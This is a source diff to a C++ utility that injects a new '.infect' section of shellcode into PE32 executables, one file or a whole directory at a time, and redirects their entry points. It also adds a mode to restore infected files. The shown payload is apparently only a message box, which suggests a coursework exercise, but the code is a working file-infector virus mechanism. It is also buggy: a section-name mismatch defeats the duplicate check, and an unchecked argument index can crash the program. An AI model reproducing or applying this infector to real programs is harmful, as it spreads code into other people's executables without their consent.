@@ -15,24 +15,28 @@ DWORD align(DWORD size, DWORD align, DWORD address) {
     return address + (size / align + 1) * align;
 }
 
+bool CheckIfSecionExist(PIMAGE_SECTION_HEADER pSectionHeader, WORD sectionCount) {
+    // Check if '.inflect' section exist
+    for (int order = 0; order < sectionCount; order++) {
+        PIMAGE_SECTION_HEADER currentSection = pSectionHeader + order;
+        if (!strcmp((char*)currentSection->Name, ".inflect")) {
+            return true;
+        }
+    }
+    return false;
+}
+
 bool CreateNewSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& bytesWritten, DWORD sizeOfSection) {
     PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
     WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;
 
-    const char sectionName[] = ".inflect";
-
-    // Check if '.inflect' section exist
-    for (int order = 0; order < sectionCount; order++) {
-        PIMAGE_SECTION_HEADER currentSection = pSectionHeader + order;
-        if (!strcmp((char*)currentSection->Name, sectionName)) {
-            cerr << "PE section already exists" << endl;
-            CloseHandle(hFile);
-            return false;
-        }
+    if (CheckIfSecionExist(pSectionHeader, sectionCount)) {
+        cerr << "Error: PE section already exists" << endl;
+        return false;
     }
 
     ZeroMemory(&pSectionHeader[sectionCount], sizeof(IMAGE_SECTION_HEADER));
-    CopyMemory(&pSectionHeader[sectionCount].Name, sectionName, 8);
+    CopyMemory(&pSectionHeader[sectionCount].Name, ".infect", 8);
     // Using 8 bytes for section name,cause it is the maximum allowed section name size
 
     // Insert all the required information about our new PE section
@@ -62,7 +66,6 @@ bool CreateNewSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, 
     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
     // Adding all the modifications to the file
     WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);
-    // CloseHandle(hFile);
     return true;
 }
 
@@ -128,6 +131,98 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DW
     return true;
 }
 
+// Get entry point from shellcode
+uint32_t GetEntryPoint(PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte) {
+    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(pNtHeader);
+    PIMAGE_SECTION_HEADER last = first + pNtHeader->FileHeader.NumberOfSections - 1;
+    // Point pByte to address offset 0x100 of last section
+    pByte += last->PointerToRawData + 0x100;
+    uint32_t originEntryPoint = *(uint32_t*)(pByte + 14);
+    return originEntryPoint;
+}
+
+// Recover file to origin file
+bool RecoverFile(const char* fileName) {
+    // Load file
+    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        cerr << "Error: Fail to open file "<< endl;
+        return false;
+    }
+
+    // Map file into memory
+    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
+    if (hMap == NULL) {
+        cerr << "Error: Fail to map file into memory" << endl;
+        return false;
+    }
+
+    LPVOID lpBase = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+    if (lpBase == NULL) {
+        cerr << "Error: Fail to load file" << endl;
+        return false;
+    }
+
+    // Set some variable 
+    DWORD byteWritten = 0;
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    unsigned char* pByte = (unsigned char*)malloc(fileSize);
+
+    if (pByte == NULL) {
+        cerr << "Error: Fail to load file" << endl;
+        return false;
+    }
+
+    ReadFile(hFile, pByte, fileSize, &byteWritten, NULL);
+    if (byteWritten != fileSize) {
+        cerr << "Error: Fail to read file" << endl;
+        return false;
+    }
+
+    // Get header of file
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        cout << "Error: Fail to load DOS header" << endl;
+        return false;
+    }
+
+    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
+    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
+        cout << "Error: Fail to load NT header" << endl;
+        return false;
+    }
+
+    // Get address of section
+    uint32_t entryPoint = GetEntryPoint(pNtHeader, pByte);
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeader);
+    PIMAGE_SECTION_HEADER lastSection = section + pNtHeader->FileHeader.NumberOfSections - 1;
+    pNtHeader->OptionalHeader.AddressOfEntryPoint = entryPoint - pNtHeader->OptionalHeader.ImageBase;
+    
+    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+    UnmapViewOfFile(lpBase);
+    CloseHandle(hMap);
+    WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
+
+    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)section[i].Name, ".infect") == 0) {
+            // delete the shellcode section
+            memmove(&section[i], &section[i + 1], (pNtHeader->FileHeader.NumberOfSections - i - 1) * sizeof(IMAGE_SECTION_HEADER));
+            pNtHeader->FileHeader.NumberOfSections -= 1;
+            pNtHeader->OptionalHeader.SizeOfImage -= sizeof(IMAGE_SECTION_HEADER);
+            pNtHeader->OptionalHeader.SizeOfHeaders -= sizeof(IMAGE_SECTION_HEADER);
+            break;
+        }
+    }
+
+    SetEndOfFile(hFile);
+    WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
+    CloseHandle(hFile);
+
+    cerr << "Success to recover file " << fileName << endl;
+    return true;
+}
+
 bool OpenFile(const char* fileName) {
     // Open file and get information
     HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -142,6 +237,7 @@ bool OpenFile(const char* fileName) {
         cerr << "Error: File " << fileName << " empty, try another one" << endl;
         return false;
     }
+
     // Buffer to allocate
     BYTE* pByte = new BYTE[fileSize];
     DWORD byteWritten;
@@ -196,18 +292,47 @@ bool OpenDirectory(const char* pathDirectory) {
     if (countFile == 0) {
         return false;
     }
+
     return true;
 }
 
 int main(int argc, char* argv[]) {
 
     if (argc < 2) {
-        cout << "Usage: " << argv[0] << " <path\\of\\directory\\>" << endl;
+        cout << "\t" << argv[0] << ": A simple utility for indecting Message Box into any PE32 EXE file" << endl;
+        cout << "\tExample:	" << argv[0] << " -f <file.exe> -r" << endl << endl;
+        cout << "\tUsage		Description" << endl;
+        cout << "\t-----		-----------------------------------------------------------------" << endl;
+        cout << "\t -f	        Infect Message Box into only one file" << endl;
+        cout << "\t -d	        Infect Message Box into one directory" << endl;
+        cout << "\t -r	        Recover file to original state" << endl;
         return 1;
     }
-    
-    if (!OpenDirectory(argv[1])) {
-        cerr << "Error: Invalid or empty directory" << endl;
+
+    bool doRecover = false;
+
+    if (strcmp(argv[3], "-r") == 0) {
+        doRecover = true;
+    }
+
+    if (doRecover == false) {
+        if (strcmp(argv[1], "-f") == 0) {
+            if (!OpenFile(argv[2])) {
+                cerr << "Error: invalid file" << endl;
+            }
+        }
+        else if (strcmp(argv[1], "-d") == 0) {
+            if (!OpenDirectory(argv[2])) {
+                cerr << "Error: invalid directory" << endl;
+            }
+        }
+    } 
+    else {
+        if (strcmp(argv[1], "-f") == 0) {
+            if (!RecoverFile(argv[2])) {
+                cerr << "Error: invalid file" << endl;
+            }
+        }
     }
 
     return 0;
